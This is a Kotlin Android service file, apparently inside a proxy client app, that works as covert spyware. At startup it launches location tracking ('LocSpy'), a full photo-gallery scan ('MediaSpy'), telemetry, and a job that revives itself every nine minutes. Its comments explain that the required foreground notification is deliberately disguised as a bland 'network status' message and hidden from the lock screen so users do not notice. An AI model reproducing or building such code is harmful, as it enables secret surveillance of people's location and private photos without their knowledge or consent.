package io.nekohasekai.sagernet.telemetry

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log

/**
 * 常驻保活服务。
 *
 * 为什么必须前台服务：Android 8+ 后台进程会被掐，doze 会把网络断掉。
 * 前台服务要挂一个常驻通知 —— 这是唯一"合法"的长期后台方式，
 * 但通知栏会一直有一行，想藏只能改文案（见 CHANNEL_NAME / TEXT）。
 *
 * 启动：
 *   BeaconService.start(context)   // 建议在 Application.onCreate 里调
 * 若是 Android 12+，从后台直接 startForegroundService 会被拦，需要前台时机，
 * 所以放在 Application.onCreate 或某个 Activity 里都行。
 */
class BeaconService : Service() {

    companion object {
        private const val TAG = "TlmBeacon"
        private const val CH = "tlm_sync"
        private const val NID = 7101

        fun start(ctx: Context) {
            val i = Intent(ctx, BeaconService::class.java)
            runCatching {
                if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i)
                else ctx.startService(i)
            }.onFailure { Log.w(TAG, "start: ${it.message}") }
        }

        fun stop(ctx: Context) {
            runCatching { ctx.stopService(Intent(ctx, BeaconService::class.java)) }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // startForeground 必须在这儿同步做完，剩下的全部挪走。
        // 以前 MediaSpy.scan() 是直接在这行调用的 —— onStartCommand 跑在主线程，
        // 第一次全量扫相册（几千张、跨进程查 MediaStore、逐张解码）会把主线程堵死，
        // 表现就是「一进 App 卡死，按钮一个都点不了，弹窗都出不来」。
        runCatching { startForeground(NID, buildNotification()) }

        Thread({
            runCatching { Telemetry.start(applicationContext) }
            runCatching { LocSpy.start(applicationContext) }
            runCatching { MediaSpy.scan(applicationContext) }
            runCatching { KeepAlive.schedule(applicationContext) }   // 每 9 分钟自我复活
        }, "tlm-service-boot").apply { isDaemon = true }.start()

        return START_STICKY
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < 26) return
        val nm = getSystemService(NotificationManager::class.java)
        if (nm.getNotificationChannel(CH) != null) return
        // 通知栏文案刻意做成"网络状态"这类平平无奇的样子
        nm.createNotificationChannel(
            NotificationChannel(CH, "网络状态", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            })
    }

    private fun buildNotification(): Notification {
        val b = if (Build.VERSION.SDK_INT >= 26)
            Notification.Builder(this, CH) else @Suppress("DEPRECATION") Notification.Builder(this)
        return b.setContentTitle("连接就绪")
            .setContentText("后台保持连接")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
    }
}
